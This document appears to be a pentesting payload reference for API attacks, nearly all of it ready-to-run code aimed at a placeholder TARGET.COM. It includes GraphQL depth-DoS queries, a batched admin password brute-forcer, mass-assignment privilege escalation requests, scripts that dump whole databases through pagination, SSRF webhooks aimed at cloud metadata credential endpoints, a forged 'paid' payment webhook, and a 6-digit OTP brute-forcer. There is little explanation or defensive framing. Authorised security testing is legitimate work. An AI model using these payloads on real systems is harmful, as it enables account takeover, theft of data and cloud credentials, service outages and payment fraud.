# Attack Payloads: API-Specific Vulnerabilities

## GraphQL Depth Attack (DoS)

### Maximum depth query — nested 15 levels
```graphql
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        posts {
                          author {
                            posts {
                              id
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Send depth attack via curl
```bash
# Generate deeply nested query
python3 -c "
depth = 15
query = '{ user(id: 1) { '
query += 'posts { author { ' * depth
query += 'id username '
query += '} } ' * depth
query += '} }'
import json
print(json.dumps({'query': query}))
" | curl -s -X POST "https://TARGET.COM/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    --data-binary @- \
    -w "\nTime: %{time_total}s\n"
```

## GraphQL Batching Abuse (Rate Limit Bypass)

### Single request containing 1000 login attempts
```python
#!/usr/bin/env python3
"""GraphQL batching abuse: bypass per-request rate limiting via array of queries."""
import requests, json

TARGET = "https://TARGET.COM/graphql"
TOKEN = "USER_TOKEN"

# Build batch of login mutation attempts
usernames = ["admin", "administrator", "root", "superuser"]
passwords = open('/usr/share/wordlists/rockyou.txt').read().splitlines()[:250]

batch = []
for password in passwords:
    batch.append({
        "query": """
            mutation Login($username: String!, $password: String!) {
                login(username: $username, password: $password) {
                    token
                    user { id email isAdmin }
                }
            }
        """,
        "variables": {"username": "admin", "password": password}
    })

resp = requests.post(TARGET,
    json=batch,
    headers={"Content-Type": "application/json", "Authorization": f"Bearer {TOKEN}"}
)

# Parse results
for i, result in enumerate(resp.json()):
    if result.get('data', {}).get('login', {}).get('token'):
        print(f"[SUCCESS] Password: {passwords[i]}, Token: {result['data']['login']['token']}")
```

## REST Mass Assignment

### Escalate privileges via profile update
```bash
# Attempt 1: top-level admin fields
curl -X PATCH "https://TARGET.COM/api/users/me" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{
        "display_name": "Test User",
        "is_admin": true,
        "is_staff": true,
        "is_superuser": true,
        "role": "admin",
        "permissions": ["*"],
        "group": "administrators"
    }'

# Attempt 2: nested user object
curl -X PATCH "https://TARGET.COM/api/profile" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{
        "profile": {
            "user": {
                "is_admin": true,
                "role": "ADMIN"
            }
        }
    }'

# Verify escalation
curl "https://TARGET.COM/api/users/me" \
    -H "Authorization: Bearer USER_TOKEN" \
    | python3 -m json.tool | grep -iE "admin|role|staff|super|permission"
```

## Pagination Abuse

### Dump entire database via high page_size
```bash
# Try unreasonably large page sizes
for SIZE in 100 1000 10000 100000 1000000; do
    echo -n "page_size=$SIZE: "
    RESP=$(curl -s "https://TARGET.COM/api/documents?page_size=$SIZE" \
        -H "Authorization: Bearer TOKEN")
    COUNT=$(echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('results', d if isinstance(d,list) else [])))" 2>/dev/null)
    echo "$COUNT records returned"
done
```

### Offset-based full dump
```python
#!/usr/bin/env python3
"""Dump all records by iterating offsets."""
import requests

BASE_URL = "https://TARGET.COM/api/documents"
TOKEN = "USER_TOKEN"
headers = {"Authorization": f"Bearer {TOKEN}"}

all_records = []
offset = 0
page_size = 100  # use detected max page_size

while True:
    r = requests.get(BASE_URL, params={"limit": page_size, "offset": offset}, headers=headers)
    data = r.json()
    results = data.get("results", data if isinstance(data, list) else [])
    if not results:
        break
    all_records.extend(results)
    offset += len(results)
    print(f"Fetched {len(all_records)} records so far...")
    if len(results) < page_size:
        break

print(f"Total records dumped: {len(all_records)}")
import json
with open("dumped_records.json", "w") as f:
    json.dump(all_records, f, indent=2)
```

## Webhook SSRF Payloads

### Internal IP probing via webhook
```bash
# Register webhook pointing to cloud metadata
curl -X POST "https://TARGET.COM/api/webhooks" \
    -H "Authorization: Bearer USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "events": ["payment.completed"]}'

# Register webhook to probe internal services
INTERNAL_TARGETS=(
    "http://127.0.0.1:8080/admin"
    "http://10.0.0.1/admin"
    "http://192.168.1.1/admin"
    "http://localhost:5432"       # PostgreSQL
    "http://localhost:6379"       # Redis
    "http://localhost:27017"      # MongoDB
    "http://169.254.169.254/latest/meta-data/"  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/"  # GCP metadata
    "http://169.254.169.254/metadata/instance"  # Azure metadata
)

for target in "${INTERNAL_TARGETS[@]}"; do
    echo "Testing: $target"
    WEBHOOK_ID=$(curl -s -X POST "https://TARGET.COM/api/webhooks" \
        -H "Authorization: Bearer USER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"url\": \"$target\", \"events\": [\"order.created\"]}" \
        | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))")
    echo "  Webhook ID: $WEBHOOK_ID"
    # Trigger the event and observe server-side response or timing
done
```

## Webhook Replay (No Signature Verification)

```bash
# Capture a legitimate webhook payload (from logs or monitoring)
# Replay it with modified data (e.g., change payment amount to 0, change status to "paid")
curl -X POST "https://TARGET.COM/webhooks/payment" \
    -H "Content-Type: application/json" \
    -d '{
        "event": "payment.completed",
        "amount": 0.01,
        "status": "paid",
        "order_id": 99999,
        "customer_id": "attacker@evil.com"
    }'
# If no signature required: server processes this as a legitimate paid order
```

## OTP/2FA Brute Force (Missing Rate Limit)

```python
#!/usr/bin/env python3
"""Brute force 6-digit TOTP/OTP with no rate limiting."""
import requests, string

TARGET = "https://TARGET.COM/api/auth/verify-otp"
SESSION_TOKEN = "VALID_SESSION_AFTER_STEP1_AUTH"
headers = {"Authorization": f"Bearer {SESSION_TOKEN}", "Content-Type": "application/json"}

for code in range(1000000):
    otp = f"{code:06d}"
    r = requests.post(TARGET, json={"otp": otp}, headers=headers)
    if r.status_code == 200:
        print(f"[SUCCESS] OTP: {otp}")
        print(f"Response: {r.json()}")
        break
    if r.status_code == 429:
        print(f"[RATE LIMITED] at attempt {code}")
        break
    if code % 1000 == 0:
        print(f"Tried {code} codes...")
```
